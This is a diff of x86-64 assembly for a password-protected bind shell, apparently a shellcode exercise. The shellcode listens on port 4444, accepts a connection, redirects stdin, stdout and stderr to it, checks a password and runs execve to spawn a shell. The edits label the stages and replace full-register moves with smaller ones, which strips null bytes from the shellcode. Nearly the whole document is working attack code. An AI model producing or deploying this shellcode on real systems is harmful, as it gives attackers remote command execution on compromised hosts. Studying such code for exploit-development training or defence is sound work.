@@ -7,7 +7,7 @@ _start:
     pass_len: db $-password
 
 real_start:
-
+socket:
     ; sock = socket(AF_INET, SOCK_STREAM, 0)
     ; AF_INET = 2
     ; SOCK_STREAM = 1
@@ -25,6 +25,7 @@ real_start:
 
     mov rdi, rax
 
+bind:
     ; server.sin_family = AF_INET;    short
     ; server.sin_port = htons(4444);    unsigned short
     ; server.sin_addr.s_addr = INADDR_ANY;    unsigned long
@@ -39,6 +40,8 @@ real_start:
     ; };
     ;
     ; bind(sock, (struct sockaddr *)&server, sockaddr_len)
+    ; INADDR_ANY = 0
+    ; AF_INET = 2
     ; __NR_bind = 49
 
     xor rax, rax
@@ -49,24 +52,27 @@ real_start:
     push word 2
 
     ; bind
-    mov rax, 49
+    add al, 49
     mov rsi, rsp
-    mov rdx, 16  ; sizeof(sockaddr_in)
+    add dl, 16  ; sizeof(sockaddr_in)
     syscall
 
+listen:
     ; listen(sock, 2)
     ; __NR_listen = 50
 
-    mov rax, 50
-    mov rsi, 2
+    mov al, 50
+    xor rsi, rsi
+    mov sil, 2
     syscall
 
+accept:
     ; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
     ; __NR_accept = 43
 
-    mov rax, 43
+    mov al, 43
     xor rsi, rsi
-    xor rdx, rdx
+    ;xor rdx, rdx
     syscall
     
     mov rbx, rax
@@ -74,33 +80,36 @@ real_start:
     ; close(sock)
     ; __NR_close = 3
 
-    mov rax, 3
+    mov al, 3
     syscall
 
+dup2:
     ; dup2(new, 0);
     ; dup2(new, 1);
     ; dup2(new, 2);
     ; __NR_dup2 = 33
 
-    mov rax, 33
+    xor al, al
+
+    mov al, 33
     mov rdi, rbx
     xor rsi, rsi
     syscall
 
-    mov rax, 33
+    mov al, 33
     inc rsi
     syscall
 
-    mov rax, 33
+    mov al, 33
     inc rsi
     syscall
 
 check_password:
-    mov rax, 0
+    xor rax, rax
     ; rdi = fd (bound socket)
     sub rsp, 16   ; create space for "buf" in the stack
     mov rsi, rsp  ; rsi = *buf
-    mov rdx, 16
+    mov dl, 16
     syscall
 
     ; compare password
@@ -111,8 +120,10 @@ check_password:
     repz cmpsb
     jne exit
 
+execve:
     %include "execve-stack.nasm"
 
 exit:
-    mov rax, 60
+    xor rax, rax
+    mov al, 60
     syscall
